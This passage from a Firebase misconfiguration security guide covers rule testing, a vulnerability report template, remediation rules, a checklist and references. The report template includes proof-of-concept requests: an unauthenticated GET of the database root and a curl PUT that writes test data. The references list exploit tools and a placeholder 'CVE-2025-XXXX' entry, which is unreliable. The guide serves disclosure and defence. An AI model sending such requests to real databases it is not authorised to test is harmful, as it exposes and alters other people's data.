        (request.auth.uid == resource.data.senderId || 
         request.auth.uid == resource.data.recipientId);
      allow create: if request.auth != null;
    }
    
    // Admin-only collection
    match /admin/{document=**} {
      allow read, write: if request.auth != null && 
        request.auth.token.admin == true;
    }
  }
}
```

### Testing Security Rules

```bash
# Using Firebase CLI to test rules locally
# Requires firebase-tools installation

# Install Firebase CLI
npm install -g firebase-tools

# Test rules against a rules file
firebase database:rules:test rules.json

# Deploy rules (requires authentication)
firebase deploy --only database

# Test Firestore rules
firebase firestore:rules:test firestore.rules
```

---

## Reporting Findings

When reporting Firebase misconfigurations, provide comprehensive documentation including proof of concept, impact assessment, and remediation guidance.

**Sample Vulnerability Report Template:**

```
Title: Firebase Misconfiguration - Unauthenticated Database Access

Severity: Critical / High / Medium (based on data sensitivity)

Affected Component: Firebase Realtime Database / Firestore / Storage

Description:
The Firebase instance at [PROJECT-ID].firebaseio.com is configured with security
rules that allow unauthenticated read [and write] access to all data stored in
the database.

Steps to Reproduce:
1. Using any HTTP client, send a GET request to:
   https://[PROJECT-ID].firebaseio.com/.json

2. The server returns a 200 OK response with the following data:
   [INCLUDE SAMPLE DATA WITH SENSITIVE INFORMATION REDACTED]

3. [If write access] Using a PUT request, data can be modified:
   curl -X PUT -d '{"test": "vulnerable"}' \
     https://[PROJECT-ID].firebaseio.com/test.json

Impact:
- Unauthorized access to [NUMBER] user records containing:
  - Email addresses: [COUNT]
  - Phone numbers: [COUNT]
  - Plaintext passwords: [COUNT]
  - Personal identification documents: [COUNT]
  - Private messages: [COUNT]
  - Payment/billing information: [COUNT]

- [If write access] Attackers can:
  - Modify or delete existing data
  - Inject malicious content (stored XSS)
  - Perform ransomware-style attacks
  - Create unauthorized administrative accounts

- Compliance violations may include:
  - GDPR Article 32 (security of processing)
  - CCPA (failure to implement reasonable security)
  - HIPAA (if health data exposed)

Proof of Concept:
[ATTACH FULL PoC SCRIPT OR COMMANDS]

Remediation:
1. Immediately update Firebase security rules to restrict access:
   
   // Realtime Database
   {
     "rules": {
       ".read": "auth != null",
       ".write": "auth != null && auth.uid === data.child('ownerId').val()"
     }
   }

2. Implement per-user data isolation:
   {
     "rules": {
       "users": {
         "$uid": {
           ".read": "$uid === auth.uid",
           ".write": "$uid === auth.uid"
         }
       }
     }
   }

3. Conduct a full audit of all Firebase services:
   - Realtime Database
   - Cloud Firestore
   - Cloud Storage buckets
   - Cloud Functions

4. Rotate any exposed API keys and credentials

5. Review Firebase Security Checklist:
   https://firebase.google.com/support/guides/security-checklist

Affected Users:
~[NUMBER] users affected based on data analysis

Data Types Exposed:
[List all categories of exposed data]

Timeline:
- [DATE] Initial discovery
- [DATE] Vendor notification
- [DATE] Vendor acknowledgment
- [DATE] Remediation verified

CVSS Score: [CALCULATE BASED ON IMPACT]
Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
```

---

## Remediation Best Practices

### Immediate Actions for Data Exposure

When a Firebase misconfiguration is discovered, take the following immediate actions:

```javascript
// 1. DEPLOY EMERGENCY SECURITY RULES - Most Restrictive First

// Emergency rule - block ALL access temporarily
{
  "rules": {
    ".read": false,
    ".write": false
  }
}

// Then gradually restore access with proper rules
{
  "rules": {
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
      }
    }
  }
}

// 2. REGENERATE ALL CREDENTIALS
// - Rotate API keys in Firebase Console
// - Regenerate service account keys
// - Invalidate existing sessions

// 3. ENABLE AUDIT LOGS
// Firebase Console > Project Settings > Audit Logs > Enable
```

### Long-Term Security Configuration

```javascript
// Comprehensive Firebase Security Configuration

// 1. Realtime Database Security Rules
{
  "rules": {
    // Deny all access by default
    ".read": false,
    ".write": false,
    
    // User data - only accessible by the owning user
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid",
        ".indexOn": ["email", "createdAt"]
      }
    },
    
    // Public data - readable by all, writable only by admins
    "public_data": {
      ".read": true,
      ".write": "auth !== null && auth.token.admin === true",
      ".validate": "newData.hasChildren(['id', 'content'])"
    },
    
    // User-generated content with ownership validation
    "user_content": {
      "$userId": {
        ".read": "auth !== null",
        ".write": "$userId === auth.uid",
        "$contentId": {
          ".validate": "newData.hasChildren(['type', 'content', 'timestamp'])"
        }
      }
    },
    
    // Rate limiting for write operations
    "temp_writes": {
      ".write": "auth !== null && (newData.val() === null || !data.exists())"
    }
  }
}

// 2. Firestore Security Rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Deny all by default
    match /{document=**} {
      allow read, write: if false;
    }
    
    // User profiles - strict ownership
    match /users/{userId} {
      allow read: if request.auth != null && request.auth.uid == userId;
      allow write: if request.auth != null && request.auth.uid == userId;
      
      match /{subcollection=**} {
        allow read, write: if request.auth != null && request.auth.uid == userId;
      }
    }
    
    // Public collections - read-only for all
    match /public/{document} {
      allow read: if true;
      allow write: if false;
    }
    
    // Collection with field-level validation
    match /posts/{postId} {
      allow read: if true;
      allow create: if request.auth != null && 
        request.resource.data.size() <= 10 &&  // Limit fields
        request.resource.data.title is string &&
        request.resource.data.title.size() <= 200 &&
        request.resource.data.content is string &&
        request.resource.data.authorId == request.auth.uid;
      
      allow update: if request.auth != null &&
        request.auth.uid == resource.data.authorId &&
        (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['title', 'content']));
      
      allow delete: if request.auth != null &&
        (request.auth.uid == resource.data.authorId || 
         request.auth.token.admin == true);
    }
  }
}
```

### Security Checklist for Firebase Deployments

```
[ ] Database Rules
    [ ] No `.read: true` at root level in production
    [ ] No `.write: true` at root level in production
    [ ] Authentication required for all private data access
    [ ] Per-user data isolation implemented
    [ ] Input validation rules applied
    [ ] Indexes configured for efficient queries

[ ] Authentication
    [ ] Email verification required for email/password auth
    [ ] Multi-factor authentication enabled
    [ ] Weak password policies disabled
    [ ] Session expiration configured appropriately
    [ ] Anonymous auth disabled unless required

[ ] Storage
    [ ] Bucket rules restrict access to authenticated users
    [ ] No public write access to storage buckets
    [ ] File type restrictions implemented
    [ ] File size limits configured

[ ] Cloud Functions
    [ ] Authentication required for function endpoints
    [ ] Input sanitization implemented
    [ ] Rate limiting configured
    [ ] No environment secrets in code

[ ] Monitoring
    [ ] Firebase alerts configured for unusual activity
    [ ] Audit logs enabled and reviewed
    [ ] Security rules tested monthly
    [ ] Dependency updates automated
```

---

## References and Resources

### Official Documentation
- [Firebase Security Rules Documentation](https://firebase.google.com/docs/rules)
- [Firebase Security Checklist](https://firebase.google.com/support/guides/security-checklist)
- [Firebase Realtime Database Security Rules API](https://firebase.google.com/docs/reference/security/database)
- [Cloud Firestore Security Rules](https://firebase.google.com/docs/firestore/security/get-started)

### Security Research
- [FireWreck: 125 Million Records Exposed via Firebase Misconfigurations](https://env.fail/posts/firewreck-1/) 
- [OWASP Mobile Security Testing Guide - Firebase](https://mas.owasp.org/MASTG/)
- [Tea App Data Breach Analysis - Xcitium](https://threatlabsnews.xcitium.com/blog/massive-data-breach-exposes-sensitive-information-of-tea-app-users/) 

### Tools
- [Pyrebase - Python Firebase Wrapper](https://github.com/thisbejim/Pyrebase)
- [Baserunner - Firebase Security Assessment](https://github.com/iosiro/baserunner)
- [Firebase Scanner by Turr0n](https://github.com/Turr0n/firebase)
- [Firebase Exploit Tool](https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit) 

### Vulnerability Databases
- [CVE-2025-XXXX - Firebase Firestore RCE](https://github.com/imad457/-CVE-2025-XXXX-Firebase-Misconfiguration---Unauthenticated-RCE-) 
- [VulDB Entry #355075 - Investory Firebase Key Exposure](https://vuldb.com/submit/781784) 
